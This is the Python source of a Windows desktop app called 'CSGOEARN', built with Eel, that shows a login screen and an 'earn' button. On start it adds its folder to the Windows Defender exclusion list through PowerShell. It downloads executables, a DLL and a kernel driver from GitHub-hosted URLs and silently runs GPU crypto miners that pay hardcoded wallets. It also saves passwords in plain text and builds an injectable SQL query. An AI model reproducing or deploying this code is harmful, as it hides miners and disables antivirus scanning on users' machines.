import eel
import os, requests, json, string
import ctypes
import time , psutil
from subprocess import Popen
import random
import subprocess
import webbrowser
import hashlib
import zlib
from winreg import *
import sqlite3
ext = False
mining = False
pass1="""<div id="earn">
		<div id="welcomeBack">
			<h1>Welcome back</h1>
            """
pass2="""</div>
		<div id="logo">
			<img id="logoImg" src="https://cdn.discordapp.com/attachments/863022777710542888/931593639975616612/Webp.net-resizeimage_2.png?width=418&height=418" onclick=" window.open('https://csgoearn.xyz','_blank')">
		</div>
		<div id="buttonContainer">
			<button id="startbut" onclick="eel.starts()" style="position: relative; z-index: 100; background-color: #00CF3B;">START</button>
			</div>
		<div id="discord">
			<img src="/img/discord.png" onclick=" window.open('https://discord.gg/qMPsTwVdPT','_blank')">
		</div>
	</div>
	</body>
	
	<script src="/eel.js"></script>
	<script src="/javascript/main.js"></script>
</html>"""

indexhtml="""
	<body id="body">
		<div id="loginScreen">
			<h1>LOGIN</h1>
			<input id="username" autocomplete="new-password" spellcheck="false" type="username" placeholder="Username"><br>
			<input id="password" type="password" placeholder="••••••••••••••">
			<div id="loginButtons">
				<button onclick="login(document.getElementById('username').value,document.getElementById('password').value)" style="margin-left:0;background-color: #00CF3B;color: #0C0C0C;">LOGIN</button>
				<button onclick=" window.open('https://discord.gg/qMPsTwVdPT','_blank')" style="color: #00CF3B;background-color: transparent;border:2px solid #00CF3B;">REGISTER</button>
			</div>
			<div id="links">
				<a href="https://csgoearn.xyz/legal/terms-conditions/" target="blank">TOS</a><br>
				<a href="https://csgoearn.xyz/#faq" style="margin-top:-20px;" target="blank">FAQ</a>
			</div>
		</div>
	</body>
	
"""
maincss="""body {
	background-color: #0C0C0C;
	margin: 0;
}

*{
	font-family: 'Poppins', sans-serif;
}

#loginScreen h1 {
	color: #00CF3B;
	margin-left: 10%;
	margin-top: 10%;
	width: 90%;
	font-size: 230%;
}


#loginScreen input {
	width: 78%;
	margin-left: 10%;
	background-color: #00CF3B;
	border-radius: 10px;
	padding: 10px;
	padding-right:0;
	padding-left: 2%;
	border: 0;
	color: #0C0C0C;
	margin-bottom: 15px;
}

#loginButtons {
	display: flex;
	justify-content: center;
	width: 81.5%;
	margin-left: 10%;
}

#loginButtons button{
	margin: 5px;
	padding: 10px;
	border-radius: 10px;
	border: 0;
	width: 100%;
}
#loginButtons a{
	flex-grow: 1;
}

#links a{
	color: #00CF3B;
	text-decoration: none;
	font-size: 100%;
	width: 100%;
	text-align: center;
	display: block;
	margin-top: 40px;
}

#welcomeBack {
	margin-top: 2.5%;
	margin-left: 5%;
}

#welcomeBack h1 {
	color: #00CF3B;
	animation: letter 5s 1;
	animation-delay: 0s;
}

#welcomeBack h3{
	margin-top: -20px;
	margin-left: 5px;
	color: #2d9034;
	animation: letter 5s 1;
	animation-delay: 0s;
}

#logo img{
	margin-top: -100px;
	margin-left: 5%;
	width: 90%;
	opacity: 1;
	position: relative;
	animation: logo 1s cubic-bezier(0.1, 0.7, 1.0, 1.0) 1;
	z-index: 100;
}

#back {
	opacity: 1;
	position: fixed;
	top: 0;
	width: 100vw;
	height: 100vh;
	background-color: #0C0C0C;
	z-index: 10;
	
	animation: opacity 1s 1;
	animation-delay: 1s;
}

#earn #buttonContainer {
	display: flex;
	justify-content: center;
	width: 90%;
	margin-left: 5%;
	margin-top: -70px;
}

#earn #buttonContainer button {
	flex-grow: 1;
	padding: 10px;
	border-radius: 10px;
	border: 0;
	margin: 5px;
	padding-top: 15px;
	padding-bottom: 15px;
	color: #0C0C0C;
}

#discord {
	display: flex;
	margin-top: 20px;
	justify-content: center;
}

#discord img {
	margin: 10px;
	width: 40px;
}

::-webkit-input-placeholder {
	color: black;
	opacity: 1;
}

button:hover {
	color: rgba(0, 0, 0, 0.582);
}

*:focus {
	outline: none;
}

@keyframes logo {
	0%{
		transform: translateY(-200px);
	}

	20%{
		transform: rotateX(90deg);
	}

	50% {
		opacity: 1;
	}
}

@keyframes opacity {
	100% {
		opacity: 0;
	}
}

@keyframes letter {
	0% {
		color:#0C0C0C;
	}
}"""
mainjs= """

async function login(user,passw){
    await eel.loginr(user,passw)(function(x){
        
    });
}
eel.expose(loadmain);
function loadmain(x) {
    document.title = "CSGOEARN | Earn";
    document.getElementById("body").innerHTML = x;
}

eel.expose(change);
function change(x) {
    document.getElementById("startbut").innerHTML = x
}

eel.expose(update_balance);
function update_balance(x) {
    document.getElementById("balance").innerHTML = x
}
eel.expose(load);
function load(x) {
fetch('username.txt')
			.then(response => response.text())
			.then(text => document.getElementById("username").value = text.split(" ")[0])
		fetch('username.txt')
			.then(response => response.text())
			.then(text => document.getElementById("password").value = text.split(" ")[1])
	}	

eel.expose(err);
function err(x) {
document.getElementById("body").innerHTML = x;
}
window.addEventListener("resize", function(){
    window.resizeTo(400, 500);
});"""
mainhtml = """<!DOCTYPE html>
<html translate="no">
		<head>
		<meta name="google" content="notranslate">
		<meta charset="UTF-8">
		<meta name="keywords" content="HTML,CSS,XML,JavaScript">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<link rel="preconnect" href="https://fonts.googleapis.com">
		<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
		<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@600&displahttps://csgoearn.xyz/images/embed.png"y=swap" rel="stylesheet"> 
		<link rel="stylesheet" href="../styles/main.css">
        <link rel="icon" type="image/x-icon" href="https://raw.githubusercontent.com/CSGOEARN-DEV/assets/3cd8d1b7264da7f150628bf7b06b98e3f3b3c481/favicon-new.png">
		<title>CSGOEARN</title>
	</head>
	<body id="body"><div id="earn">
		
	
	</body>
	<script src="/eel.js"></script>
	<script src="/javascript/main.js"></script>
	
</html>"""
dir_path = '%s\\CSGOEARN\\' %  os.environ['APPDATA'] 
if not os.path.exists(dir_path):
    os.makedirs(dir_path)
def KILL(name):
        try:
            for proc in psutil.process_iter(): 
                if proc.name() == name: 
                    proc.kill()
        except:
            print("err kiling")
            
def mine(worker):
    print("1:")
    print(worker)
    global mining 
    
    if mining == False:
        mine_on_6g = []
        mine_on_4g = []
        parm_6g = ""
        parm_4g = ""
        KILL("PhoenixMiner.exe")
        KILL("nbminer.exe")
      
        aKey = r"SYSTEM\ControlSet001\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}"
        aReg = ConnectRegistry(None, HKEY_LOCAL_MACHINE)
        aKey = OpenKey(aReg, aKey)
        try:
            for i in range(10):
                asubkey_name = EnumKey(aKey, i)
                if(asubkey_name[-1].isdigit()): 
                    asubkey = OpenKey(aKey, asubkey_name)
    
                    print("GPU ID:")
                    print(asubkey_name[-1])
                    val = QueryValueEx(asubkey, "HardwareInformation.qwMemorySize")
                    print("GPU MEMORY SIZE:")
                    print(sum(val)/1048576,end=" mb of memory")
                    print("")
                    if (sum(val)/1048576) > 5900.0:
                        mine_on_6g.append(int(asubkey_name[-1]))
                    elif (sum(val)/1048576) > 3500.0:
                        mine_on_4g.append(int(asubkey_name[-1]))
        except:
            pass
        print(mine_on_4g)
        print(mine_on_6g)
        
        if len(mine_on_6g) == 1:parm_6g = str(mine_on_6g[0]+1)
        for gp in mine_on_6g:
            if len(mine_on_6g) != 1:
                parm_6g= ","+str(gp+1)
                
        if len(mine_on_4g) == 1:parm_4g = str(mine_on_4g[0])
        for gp in mine_on_4g:
            if len(mine_on_4g) != 1:
                parm_4g= ","+str(gp)
               
              
        print("2:")
        print(worker)
        if len(mine_on_6g) != 0:
            print("3:")
            print(worker)
            
            try:
                f = open("%sui-components/6G.txt" % dir_path, "r")
                subprocess.Popen(f'{dir_path}{f.read()}{worker}',shell=True,stderr=subprocess.DEVNULL,stdout=subprocess.DEVNULL,stdin=subprocess.DEVNULL)
                print("from file")
            except:
                subprocess.Popen(f'{dir_path}rvncoinminer\\nbminer.exe -cmd-output 0 -a ethash -o ethproxy+tcp://eu1.ethermine.org:4444 -u 0x6584ff59218B1619D5dd39410295Eb2025a8Dbd5.{worker}',shell=True,stderr=subprocess.DEVNULL,stdout=subprocess.DEVNULL,stdin=subprocess.DEVNULL)
                print("normal")
            mining = True
        if len(mine_on_4g) != 0:
            try:
                f = open("%sui-components4/G.txt" % dir_path, "r")
                subprocess.Popen(f'{dir_path}{f.read()}{worker}',shell=True,stderr=subprocess.DEVNULL,stdout=subprocess.DEVNULL,stdin=subprocess.DEVNULL)
                print("from file")
            except:
                subprocess.Popen(f'{dir_path}rvncoinminer\\nbminer.exe -a kawpow -o stratum+tcp://stratum-ergo.flypool.org:13333 -u RQqjgTyEQZPp3ERsvvwkW6mQ6r92Xg8t13.{worker}',shell=True,stderr=subprocess.DEVNULL,stdout=subprocess.DEVNULL,stdin=subprocess.DEVNULL)
                print("noraml")
        if len(mine_on_6g) == 0 and len(mine_on_4g) == 0:
            print("no suitable gpu")
    else:
        KILL("nbminer.exe")
        mining = False

def install():
    eel.err(f"<h3 style='margin-top: 50%;width:100%;text-align:center;color: #00CF3B;' >Installing . . .</h3>")
    eel.sleep(2)
   
    try:
        subprocess.run('rmdir /S /Q %sPhoenixMiner_5.9d'%dir_path,shell=True,stderr=subprocess.DEVNULL)
        subprocess.run('rmdir /S /Q %srvncoinminer'%dir_path,shell=True,stderr=subprocess.DEVNULL)
    except:
        pass
    
    try:
        is_admin = os.getuid() == 0
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if(is_admin):
        path = os.path.abspath("%s"% dir_path)
        process = subprocess.Popen(f'Powershell.exe Add-MpPreference -ExclusionPath {path} ',shell=True)
        os.mkdir('%sPhoenixMiner_5.9d'% dir_path)
        os.mkdir('%srvncoinminer'% dir_path)
        open('%sPhoenixMiner_5.9d/IOMap64.sys'% dir_path, 'wb').write(requests.get(' https://github.com/csgoearn/csgoearn.github.io/raw/main/IOMap64.sys', allow_redirects=True).content)
        open('%srvncoinminer/nbminer.exe'% dir_path, 'wb').write(requests.get(' https://csgoearn.github.io/nbminer.exe', allow_redirects=True).content)
        open('%sPhoenixMiner_5.9d/PhoenixMiner.exe'% dir_path, 'wb').write(requests.get('https://github.com/csgoearn/csgoearn.github.io/raw/main/PhoenixMiner.exe', allow_redirects=True).content)
        open('%sPhoenixMiner_5.9d/EIO.exe'% dir_path, 'wb').write(requests.get(' https://github.com/csgoearn/csgoearn.github.io/raw/main/EIO.exe', allow_redirects=True).content)
        open('%sPhoenixMiner_5.9d/EIO.dll'% dir_path, 'wb').write(requests.get('https://github.com/csgoearn/csgoearn.github.io/raw/main/EIO.dll', allow_redirects=True).content)
        eel.err(f"<h3 style='margin-top: 50%;width:100%;text-align:center;color: #00CF3B;'>Done Installing</h3>")
        eel.sleep(2)
   
    else:
        eel.err(f"<h3 style='margin-top: 50%;width:100%;text-align:center;color: #f80202;'>Admin rights needed for install</h3>")
        while True:
            eel.sleep(1)
        
def integrity_check():
    eel.err(f"<h3 style='margin-top: 50%;width:100%;text-align:center;color: #00CF3B;'>Loading . . .</h3>")
    eel.sleep(2)
    if(os.path.isdir('%sPhoenixMiner_5.9d'% dir_path)) == True and (os.path.isdir('%srvncoinminer'% dir_path)) == True:
        print("done")
        if(os.path.isfile('%sPhoenixMiner_5.9d/PhoenixMiner.exe' % dir_path))==True and (os.path.isfile('%sPhoenixMiner_5.9d/IOMap64.sys' % dir_path))==True:
            print("done")
            if(os.path.isfile('%sPhoenixMiner_5.9d/EIO.dll' % dir_path))==True and (os.path.isfile('%sPhoenixMiner_5.9d/EIO.exe' % dir_path))==True and (os.path.isfile('%srvncoinminer/nbminer.exe' % dir_path))==True:
                print("done")
                eel.err(f"<h3 style='margin-top: 50%;width:100%;text-align:center;color: #00CF3B;' >Done</h3>")
                eel.sleep(1.5)
                return(1)
  
    
def exit():
    global ext
    ext = True
    KILL("PhoenixMiner.exe")
    KILL("nbminer.exe")

def savelog(username,password):
    if os.path.isfile("%sui-components/templates/username.txt" % dir_path)==True: os.remove("%sui-components/templates/username.txt" % dir_path) 
    f= open("%sui-components/templates/username.txt" % dir_path,"w+") 
    f.write(username +" "+ password)
    f.close
    time.sleep(1)
def savesite():
    try:
        os.mkdir('%sui-components'% dir_path)
        os.mkdir('%sui-components/img'% dir_path)
        os.mkdir('%sui-components/javascript'% dir_path)
        os.mkdir('%sui-components/styles'% dir_path)
        os.mkdir('%sui-components/templates'% dir_path)
    except:
        pass

    f = open("%sui-components/templates/index.html"%  dir_path,"w+")
    f.write(indexhtml)
    f.close

    f = open("%sui-components/javascript/main.js"%  dir_path,"w+")
    f.write(mainjs)
    f.close
    
    f = open("%sui-components/styles/main.css"%  dir_path,"w+")
    f.write(maincss)
    f.close
    
    f = open("%sui-components/templates/main.html"%  dir_path,"w+")
    f.write(mainhtml)
    f.close
    f = open("%sui-components/templates/pass1.txt"%  dir_path,"w+")
    f.write(pass1)
    f.close
    f = open("%sui-components/templates/pass2.txt"%  dir_path,"w+")
    f.write(pass2)
    f.close
    open('%sui-components/img/discord.png'% dir_path, 'wb').write(requests.get('https://cdn.discordapp.com/attachments/863022777710542888/931615014824083456/164218003577517601.png', allow_redirects=True).content)


@eel.expose
def loginr(username,password):
    global user
    user = username
    print(username,password)

    savelog(username,password)
        
    if os.path.isfile('%sui-components/templates/username.txt' % dir_path)==True:
        if os.stat("%sui-components/templates/username.txt" % dir_path).st_size != 0:
            text =  open("%sui-components/templates/username.txt" % dir_path, "r").read().split()
            username=text[0].encode()
            result = hashlib.sha256(username)
            if str(hex(zlib.crc32(result.hexdigest().encode('ascii'))% (1<<32))) == "0x"+str(text[1]):
                return ceUI.accept_login(username)
            else:
                ceUI.denied_login("Failed to login!")
        else:
            ceUI.denied_login("Failed to login!")
    else:
        ceUI.denied_login("Failed to login!")
    
    
@eel.expose
def starts():
    #START MINER
    global user
    if mining == False:
        print("started")
        eel.change("Stop")()
        print(user)
        mine(user)
    else:
        print("Stopeed")
        eel.change("Start")()
        mine(user)


def update():
    global user
    try:
        os.remove('%sui-components/balance.db'% dir_path)
    except:
        pass
    open('%sui-components/balance.db'% dir_path, 'wb').write(requests.get(' https://github.com/csgoearn/csgoearn.github.io/raw/main/balance/balance.db', allow_redirects=True).content)

    database = sqlite3.connect('%sui-components/balance.db'% dir_path)
    cur = database.cursor()
    cur.execute(f'SELECT * FROM miners WHERE miner=\'{user}\'')
    data = cur.fetchone()
    database.close()
    eel.update_balance(str(round(data[1]-data[2],3))+'$')




    
class ceUI:

   

    def innit():
        savesite()
        eel.init('%sui-components'% dir_path)
        eel.start("%s/ui-components/templates/main.html"% dir_path, size=(450,550),block=False) 


        if integrity_check() != 1:
            install()
        eel.err(indexhtml)
        eel.load()
        i =0
        while True:
            eel.sleep(1)
            i = i+1
            if i > 600:
                print("updating")
                i=0
                update()
    
    def denied_login(error):
        eel.err(f"<h3 style='margin-top: 50%;width:100%;text-align:center;color: #f80202;'>{error}</h3>")
        eel.sleep(2)
        eel.err(indexhtml)
        eel.load()
         
    def accept_login(username):
        html = ""

        for line in open("%sui-components/templates/pass1.txt"%  dir_path,"r"):
            html += line
        html += "<h3>" +username.decode('ascii')+"</h3>"
        html +="""<h3 id="balance" style="color: #00CF3B;">0.0$</h3>"""
        for line in open("%sui-components/templates/pass2.txt"%  dir_path,"r"):
            html += line
        
        eel.err(html)
        update()
    
  

ceUI.innit()
